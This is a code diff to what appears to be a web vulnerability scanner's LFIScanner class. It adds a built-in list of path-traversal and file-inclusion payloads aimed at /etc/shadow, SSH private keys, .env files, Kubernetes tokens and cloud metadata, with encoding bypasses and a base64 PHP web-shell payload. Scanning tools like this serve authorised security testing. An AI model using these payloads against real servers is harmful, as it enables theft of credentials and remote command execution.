@@ -34,27 +34,154 @@ class LFIScanner(BaseScanner):
 
     def get_payloads(self):
         """Load LFI payloads"""
+        # Modern 2025 LFI/Path Traversal payloads
+        default_payloads = [
+            # Classic Linux/Unix
+            "../../../etc/passwd",
+            "..\\..\\..\\..\\..\\..\\etc\\passwd",
+            "../../../../etc/passwd",
+            "../../../../../etc/passwd",
+            "../../../../../../etc/passwd",
+            "../../../../../../../etc/passwd",
+            "../../../../../../../../etc/passwd",
+            "../../../../../../../../../etc/passwd",
+            # Absolute paths
+            "/etc/passwd",
+            "/etc/shadow",
+            "/etc/group",
+            "/etc/hosts",
+            "/etc/hostname",
+            "/etc/issue",
+            # Classic Windows
+            "..\\..\\..\\windows\\system.ini",
+            "..\\..\\..\\..\\..\\windows\\system.ini",
+            "../../../../windows/system.ini",
+            "../../../../boot.ini",
+            "../../../../windows/win.ini",
+            "C:\\windows\\system32\\drivers\\etc\\hosts",
+            "C:\\windows\\system.ini",
+            # 2025 Advanced bypasses - Null byte
+            "../../../etc/passwd%00",
+            "../../../etc/passwd%00.jpg",
+            "../../../etc/passwd\x00",
+            # URL encoding bypasses
+            "..%2F..%2F..%2Fetc%2Fpasswd",
+            "..%252F..%252F..%252Fetc%252Fpasswd",  # Double encoding
+            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+            "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
+            # Unicode/UTF-8 bypasses (2025)
+            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
+            "..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd",
+            "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
+            # Overlong UTF-8
+            "%e0%80%ae%e0%80%ae/%e0%80%ae%e0%80%ae/etc/passwd",
+            # 16-bit Unicode encoding
+            "..%u002f..%u002f..%u002fetc%u002fpasswd",
+            # Path truncation (2025)
+            "../../../etc/passwd" + "A" * 5000,
+            "../../../etc/passwd/" + "." * 5000,
+            # Filter bypass - case variation
+            "../../../ETC/passwd",
+            "../../../eTc/passwd",
+            # Reverse traversal
+            "....//....//....//etc/passwd",
+            "..../..../..../etc/passwd",
+            r"....\\....\\....\\windows\system.ini",
+            # Proc filesystem (Linux)
+            "/proc/self/environ",
+            "/proc/self/cmdline",
+            "/proc/self/stat",
+            "/proc/self/status",
+            "/proc/self/fd/0",
+            "/proc/self/fd/1",
+            "/proc/self/fd/2",
+            "../../../proc/self/environ",
+            # Log files (2025 common locations)
+            "/var/log/apache2/access.log",
+            "/var/log/apache2/error.log",
+            "/var/log/nginx/access.log",
+            "/var/log/nginx/error.log",
+            "/var/log/httpd/access_log",
+            "/var/log/httpd/error_log",
+            "../../../../var/log/apache2/access.log",
+            "../../../../var/log/nginx/access.log",
+            # PHP wrappers (2025)
+            "php://filter/convert.base64-encode/resource=index.php",
+            "php://filter/read=string.rot13/resource=index.php",
+            "php://filter/convert.iconv.utf-8.utf-16/resource=index.php",
+            "php://input",
+            "php://stdin",
+            "php://fd/0",
+            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
+            "expect://ls",
+            "zip://archive.zip#shell.php",
+            "phar://phar.phar/shell.php",
+            # Config files (2025)
+            "/etc/apache2/apache2.conf",
+            "/etc/nginx/nginx.conf",
+            "/etc/mysql/my.cnf",
+            "/etc/php/7.4/apache2/php.ini",
+            "/etc/php/8.0/fpm/php.ini",
+            "/usr/local/apache2/conf/httpd.conf",
+            "../../../../etc/apache2/apache2.conf",
+            # SSH keys
+            "/root/.ssh/id_rsa",
+            "/root/.ssh/id_dsa",
+            "/root/.ssh/authorized_keys",
+            "/home/user/.ssh/id_rsa",
+            "../../../../root/.ssh/id_rsa",
+            # Application-specific (2025)
+            "../../../../var/www/html/.env",
+            "../../../../.env",
+            "../../../../.git/config",
+            "../../../../composer.json",
+            "../../../../package.json",
+            "../../../../web.config",
+            "../../../../application.properties",
+            # Cloud metadata endpoints (SSRF/LFI combo)
+            "http://169.254.169.254/latest/meta-data/",
+            "http://169.254.169.254/latest/user-data/",
+            "http://metadata.google.internal/computeMetadata/v1/",
+            # Container escapes (2025)
+            "file:///etc/passwd",
+            "file:///proc/self/environ",
+            "file:///var/run/secrets/kubernetes.io/serviceaccount/token",
+            # Java-specific
+            "WEB-INF/web.xml",
+            "WEB-INF/classes/application.properties",
+            "../../../../WEB-INF/web.xml",
+            # Node.js/Express (2025)
+            "../../../../.npmrc",
+            "../../../../package-lock.json",
+            # Database configs
+            "../../../../var/lib/mysql/mysql/user.MYD",
+            "../../../../etc/postgresql/postgresql.conf",
+        ]
+
         if self.dynamic_payloads:
             return self.dynamic_payloads
 
-        try:
-            with open(self.payload_file, "r") as f:
-                payloads = [
-                    line.strip()
-                    for line in f
-                    if line.strip() and not line.startswith("#")
-                ]
-                logger.info(f"Loaded {len(payloads)} LFI payloads")
+        # Load custom payloads from file if provided
+        if self.payload_file:
+            try:
+                with open(self.payload_file, "r") as f:
+                    custom_payloads = [
+                        line.strip()
+                        for line in f
+                        if line.strip() and not line.startswith("#")
+                    ]
+                    default_payloads.extend(custom_payloads)
+                    logger.info(f"Loaded {len(custom_payloads)} custom LFI payloads")
+                    print(
+                        f"{Config.COLOR_GREEN}[*] Loaded {len(custom_payloads)} custom payloads{Config.COLOR_RESET}\n"
+                    )
+            except Exception as e:
+                logger.error(f"Error reading payload file: {e}")
                 print(
-                    f"{Config.COLOR_GREEN}[*] Loaded {len(payloads)} custom payloads{Config.COLOR_RESET}\n"
+                    f"{Config.COLOR_ORANGE}[-] Using default payloads only{Config.COLOR_RESET}\n"
                 )
-                return payloads
-        except Exception as e:
-            logger.error(f"Error reading payload file: {e}")
-            print(
-                f"{Config.COLOR_RED}[-] Error reading payload file: {str(e)}{Config.COLOR_RESET}"
-            )
-            return []
+
+        return default_payloads
 
     def scan(self):
         """Execute LFI scan"""
